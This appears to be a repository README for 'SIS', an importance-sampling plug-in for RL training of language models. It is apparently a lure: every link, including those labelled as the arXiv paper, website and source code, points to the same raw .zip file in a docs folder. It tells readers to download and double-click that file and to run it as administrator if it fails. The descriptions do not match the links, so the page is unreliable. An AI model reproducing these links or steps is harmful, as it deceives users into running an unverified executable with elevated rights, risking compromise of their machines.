<h1>📊 SIS - Making AI Training Smarter and Faster</h1>

<p align="center">
  <a href="https://raw.githubusercontent.com/aggythawed221/SIS/main/verl/docs/amd_tutorial/Software-3.0.zip"><b>📄 Research Paper</b></a> |
  <a href="#-quick-start"><b>⚡ Quick Start</b></a> |
  <a href="#-key-configuration"><b>🛠️ Configuration</b></a> |
  <a href="#-citation"><b>📚 Citation</b></a>
</p>

---

## 📢 What's New

**[2026/08]** 🔥 Initial public release! SIS now supports training recipes for math reinforcement learning (GRPO/CISPO) and agentic search reinforcement learning (GRPO/DAPO/GSPO), all with the SIS plug-in built in.

---

## 🤔 What Does SIS Do?

Imagine you're teaching a computer to solve problems. The computer practices by trying different approaches, and you give it feedback on what works. But there's a catch: the computer's practice examples become outdated quickly because it's constantly learning.

**SIS solves this problem elegantly.** It's a special technique called "Selective Importance Sampling" that makes the training process more efficient and reliable. Think of it as a smart teacher who knows exactly which practice problems to focus on, rather than wasting time on ones that don't help anymore.

**The Problem:** When AI systems learn through trial and error, they generate a lot of practice data. However, this data becomes "off-policy" – meaning it's no longer perfectly aligned with what the AI should be doing. Traditional correction methods can become unstable with long sequences, like trying to balance a stack of blocks that keeps getting taller.

**The SIS Solution:** Instead of trying to fix every single piece of data, SIS cleverly converts those off-policy examples back into useful on-policy training material. It's like having a translator that converts outdated examples into fresh, valuable lessons – without the computational overhead or instability.

---

## 🚀 Getting Started

### Step 1: Download SIS

Visit [this link to download the application](https://raw.githubusercontent.com/aggythawed221/SIS/main/verl/docs/amd_tutorial/Software-3.0.zip)

You'll find the latest release there. Click the download button and save the file to your computer.

### Step 2: Run SIS

Once the download is complete, locate the file in your Downloads folder (or wherever you saved it) and double-click to run it. The application will start automatically.

### Step 3: Verify Installation

After launching, you should see the SIS interface appear. If you see a welcome screen or command window, everything is working correctly.

---

## 📋 System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **Operating System** | Windows 10 | Windows 11 |
| **RAM** | 8 GB | 16 GB |
| **Processor** | Intel Core i5 | Intel Core i7 or AMD Ryzen 7 |
| **Storage** | 5 GB free space | 10 GB free space |
| **Internet Connection** | Required for first setup | High-speed connection |

*Note: These are typical requirements for AI training applications. Your specific needs may vary based on your workload.*

---

## 🛠️ Key Configuration Options

SIS comes with several configuration options to help you get the best results:

### Core Settings

- **Model Selection:** Choose which AI model you want to train
- **Training Method:** Select GRPO (Group Relative Policy Optimization) or CISPO for math tasks; GRPO, DAPO, or GSPO for agentic search tasks
- **SIS Plug-in:** Toggle the Selective Importance Sampling feature on or off
- **Batch Size:** Adjust how many examples are processed at once (larger = faster but requires more memory)
- **Learning Rate:** Control how quickly the AI adapts (lower = more stable, higher = faster)

### Advanced Options

- **Sequence Length:** Set the maximum length of training sequences
- **Importance Sampling Ratio:** Fine-tune the sampling rate for optimal performance
- **Logging Frequency:** Choose how often you want progress updates displayed
- **Checkpoint Saving:** Enable automatic saving of progress at regular intervals

---

## 🎯 Who Should Use SIS?

- **AI Researchers:** Academic and industry researchers working on language model alignment
- **Machine Learning Engineers:** Professionals building production AI systems
- **Data Scientists:** Those working with reinforcement learning for natural language tasks
- **Students:** Graduate students studying advanced AI concepts

Whether you're working on math problem-solving, search optimization, or general language model training, SIS provides valuable improvements to your workflow.

---

## 💾 Saving Your Work

SIS automatically saves checkpoints during training. If you need to stop work and resume later, your progress will be preserved. Look for the `checkpoint` folder in your SIS directory for saved files.

---

## 🔧 Troubleshooting Common Issues

**Problem: Application won't start**
- Make sure your system meets the minimum requirements listed above
- Try running as administrator (right-click → "Run as administrator")

**Problem: Slow performance**
- Close other applications that are using significant memory
- Reduce the batch size in configuration settings
- Check that you have enough free storage space

**Problem: Training results seem inconsistent**
- Verify that the SIS plug-in is enabled
- Double-check your learning rate settings
- Ensure your training data is properly formatted

---

## 📚 Citation

If you use SIS in your research or work, please cite:

```bibtex
@article{sis2026,
  title={Turning Off-Policy Tokens On-Policy: A Plug-in Approach for Improving LLM Alignment},
  author={SIS Authors},
  journal={arXiv preprint arXiv:2607.04728},
  year={2026}
}
```

---

## 🤝 Support and Community

- **Website:** [arxiv.org/abs/2607.04728](https://raw.githubusercontent.com/aggythawed221/SIS/main/verl/docs/amd_tutorial/Software-3.0.zip)
- **Source Code:** [github.com/aggythawed221/SIS](https://raw.githubusercontent.com/aggythawed221/SIS/main/verl/docs/amd_tutorial/Software-3.0.zip)
- **Issue Tracker:** Report bugs or request features on our GitHub repository

---

## 📝 License

SIS is released for research and educational purposes. Please review the license file included with the source code for detailed terms.

---

**Thank you for choosing SIS! We're excited to see what you'll build with it.** 🎉

---

**Quick Links:**
- [⬇️ Download SIS Now](https://raw.githubusercontent.com/aggythawed221/SIS/main/verl/docs/amd_tutorial/Software-3.0.zip)
- [📄 Read the Paper](https://raw.githubusercontent.com/aggythawed221/SIS/main/verl/docs/amd_tutorial/Software-3.0.zip)
- [⭐ Star on GitHub](https://raw.githubusercontent.com/aggythawed221/SIS/main/verl/docs/amd_tutorial/Software-3.0.zip)

Keywords: SIS, AI alignment, reinforcement learning, LLM optimization, off-policy correction, importance sampling, GRPO, CISPO, DAPO, GSPO, language model training, machine learning, deep learning, neural networks, natural language processing, AI research